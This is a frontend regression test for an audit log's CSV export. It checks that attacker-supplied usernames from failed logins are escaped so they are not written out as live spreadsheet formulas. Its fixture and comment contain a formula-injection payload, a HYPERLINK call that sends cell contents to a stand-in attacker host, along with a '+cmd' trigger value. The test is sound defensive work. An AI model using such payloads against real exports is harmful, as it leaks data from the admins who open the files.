import { describe, it, expect, vi } from 'vitest'
import { screen, waitFor } from '@testing-library/react'
import userEvent from '@testing-library/user-event'
import { renderWithProviders } from '../test/helpers'
import { Audit } from './Audit'

vi.mock('../lib/api', () => ({
  api: { get: vi.fn() },
  getErrorMessage: (_e: unknown, f: string) => f,
}))
import { api } from '../lib/api'

// A failed login stores whatever username was sent, without authentication,
// and the audit export wrote it into the CSV as-is: a username such as
// =HYPERLINK("https://evil/?"&A1,"x") became a live formula in the
// spreadsheet the admin opened.
describe('Audit CSV export', () => {
  it('writes attacker-controlled cells as text, not formulas', async () => {
    vi.mocked(api.get).mockResolvedValue({
      data: {
        data: [
          { id: 1, timestamp: '2026-10-24T10:00:00Z', username: '=HYPERLINK("https://evil.test/?"&A1,"x")', action: 'login_failed', target: '203.0.113.5', details: '+cmd' },
          { id: 2, timestamp: '2026-10-24T10:01:00Z', username: 'admin', action: 'login', target: '', details: '' },
        ],
        total: 2,
      },
    })
    let blob: Blob | undefined
    const createURL = vi.fn((b: Blob) => { blob = b; return 'blob:x' })
    vi.stubGlobal('URL', Object.assign(URL, { createObjectURL: createURL, revokeObjectURL: vi.fn() }))
    const click = vi.spyOn(HTMLAnchorElement.prototype, 'click').mockImplementation(() => {})

    renderWithProviders(<Audit />)
    await waitFor(() => expect(screen.getByText('admin')).toBeInTheDocument())
    await userEvent.click(screen.getByRole('button', { name: /csv/i }))

    expect(createURL).toHaveBeenCalled()
    const text = await blob!.text()
    expect(text).toContain(`"'=HYPERLINK(""https://evil.test/?""&A1,""x"")"`)
    expect(text).toContain(`"'+cmd"`)
    expect(text).not.toMatch(/(^|,)"=/m)
    expect(text).toContain('"admin"')
    click.mockRestore()
  })
})
